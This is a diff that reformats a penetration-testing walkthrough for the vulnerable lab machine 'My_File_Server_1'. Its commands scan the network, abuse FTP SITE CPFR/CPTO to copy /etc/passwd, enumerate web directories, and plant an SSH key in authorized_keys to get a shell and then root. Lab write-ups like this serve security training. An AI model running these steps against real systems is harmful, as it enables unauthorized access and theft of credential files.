@@ -1,201 +1,232 @@
-<div class="page">
-
 # My_File_Server_1
 
-\
+## Machine Information
 
-## 
+- **Machine:** My_File_Server_1
+- **Platform:** Offensive Pentesting Lab
+- **Repository:** https://github.com/InfoSecWarrior/Offensive-Pentesting-Lab/tree/main/Vulnerable-OVA
 
-## My_File_Server_1
+---
 
-- **<span style="color:#237522;">My_File_Server_1</span>** :-
+# Lab Setup
 
-<!-- -->
-
-- <span style="color:#9141ac;">Download the machine and import in vm box
-  </span>:
-
-<!-- -->
-
-- Go to repo :
-  <https://github.com/InfoSecWarrior/Offensive-Pentesting-Lab/tree/main/Vulnerable-OVA>
-- Download the machine .
-
-<!-- -->
-
-- Import the machine in virtual box .
+1. Download the vulnerable machine.
+2. Import the OVA into VirtualBox.
+3. Start the virtual machine.
 
 ![](images/9-1.png)
 
-- Find the machine ip :
+---
 
-<div class="codebox">
+# Network Enumeration
 
-    nmap -sn 192.168.2.0/24 
+## Discover the Target
 
-</div>
+```bash
+nmap -sn 192.168.2.0/24
+```
 
 ![](images/9-2.png)
 
-- Find the available port :
+---
 
-<div class="codebox">
+## Port Scan
 
-    nmap -v -p- 192.168.2.179
-
-</div>
+```bash
+nmap -v -p- 192.168.2.179
+```
 
 ![](images/9-3.png)
 
-- Now try to login ftp :
+---
 
-<div class="codebox">
+# FTP Enumeration
 
-    ftp 192.168.2.179
+## Connect to FTP (Default Port)
 
-</div>
+```bash
+ftp 192.168.2.179
+```
 
-![](images/9-4.png) Show the vsFTPd version .
+The server displays the **vsFTPd** version.
 
-<div class="codebox">
+![](images/9-4.png)
 
-    ftp 192.168.2.179 2121
+---
 
-</div>
+## Connect to FTP on Port 2121
+
+```bash
+ftp 192.168.2.179 2121
+```
 
 ![](images/9-5.png)
 
-- Now again login port 2121 and run the command :
+---
 
-<div class="codebox">
+## Display Available Commands
 
-    ftp 192.168.2.179 2121
-
-</div>
-
-<div class="codebox">
-
-    ?
-
-</div>
+```text
+?
+```
 
 ![](images/9-6.png)
 
-<div class="codebox">
+---
 
-    site help
+## SITE Commands
 
-</div>
+```text
+site help
+```
 
-<div class="codebox">
+```text
+site cpfr /etc/passwd
+```
 
-    site cpfr /etc/passwd
-
-</div>
-
-<div class="codebox">
-
-    site cpto /var/ftp/pub/passwd
-
-</div>
+```text
+site cpto /var/ftp/pub/passwd
+```
 
 ![](images/9-7.png)
 
-- Now exit and again login :
+---
+
+## Reconnect to FTP
+
+Exit the session and connect again.
 
 ![](images/9-8.png)
 
 ![](images/9-9.png)
 
-- Now download the passwd file and see the content :
+---
+
+## Retrieve the Password File
+
+Download the copied `passwd` file and inspect its contents.
 
 ![](images/9-10.png)
 
-![](images/9-11.png) Here the passwd file content .
+![](images/9-11.png)
 
-- Visit the ip in browser : <http://192.168.2.179/>
+---
+
+# Web Enumeration
+
+Visit the target.
+
+```
+http://192.168.2.179/
+```
 
 ![](images/9-12.png)
 
-- Find the hidden endpoints :
+---
 
-<div class="codebox">
+## Directory Enumeration
 
-    feroxbuster -u http://192.168.2.179/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
-
-</div>
+```bash
+feroxbuster \
+-u http://192.168.2.179/ \
+-w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+```
 
 ![](images/9-13.png)
 
-- Visit the endpoints : <http://192.168.2.179/index.html>
-  <http://192.168.2.179/readme.txt>
+---
+
+## Interesting Files
+
+```
+http://192.168.2.179/index.html
+http://192.168.2.179/readme.txt
+```
 
 ![](images/9-14.png)
 
-- Login ftp with local user :
+---
 
-![](images/9-15.png) After login make .ssh directory not .ss directory .
+# SSH Access
 
-- Now place rsa key :
+## Login to FTP Using the Local User
 
-<div class="codebox">
+After authentication, create the **.ssh** directory (not `.ss`).
 
-    ssh-keygen -b 2048 -t rsa -f ./id_rsa -q -N ""
+![](images/9-15.png)
 
-</div>
+---
+
+## Generate an SSH Key Pair
+
+```bash
+ssh-keygen -b 2048 -t rsa -f ./id_rsa -q -N ""
+```
 
 ![](images/9-16.png)
 
-- id_rsa.pub file place in server :
+---
 
-<div class="codebox">
+## Create the Authorized Keys File
 
-    cp id_rsa.pub authorized_keys
+```bash
+cp id_rsa.pub authorized_keys
+```
 
-</div>
+---
 
-- In ftp user :
+## Upload the Public Key
 
-<div class="codebox">
+Change the local working directory.
 
-    lcd Downloads
+```text
+lcd Downloads
+```
 
-</div>
+Navigate to the remote SSH directory.
 
-- 
+```text
+cd .ssh
+```
 
-<div class="codebox">
+Upload the public key.
 
-    cd .ssh
-
-</div>
-
-- 
-
-<div class="codebox">
-
-    put authorized_keys
-
-</div>
+```text
+put authorized_keys
+```
 
 ![](images/9-17.png)
 
-- Note : Isme write ki power thi isliye file le gye .
+> **Note:** The FTP account had write permissions, allowing the public key to be uploaded successfully.
 
-<!-- -->
+---
 
-- Now login with ssh :
+## SSH Login
 
-<div class="codebox">
-
-    ssh smbuser@192.168.2.179 -i id_rsa
-
-</div>
+```bash
+ssh smbuser@192.168.2.179 -i id_rsa
+```
 
 ![](images/9-18.png)
 
-- Login with root :
+---
+
+## Root Access
+
+After logging in, switch to the root account.
 
 ![](images/9-19.png)
 
-</div>
+---
+
+# Attack Flow
+
+1. Discover the target.
+2. Enumerate open ports.
+3. Interact with the FTP service.
+4. Copy `/etc/passwd` using FTP `SITE` commands.
+5. Enumerate the web server.
+6. Authenticate to FTP with a local user.
+7. Upload an SSH public key.
+8. Log in via SSH using the private key.
+9. Obtain root access.
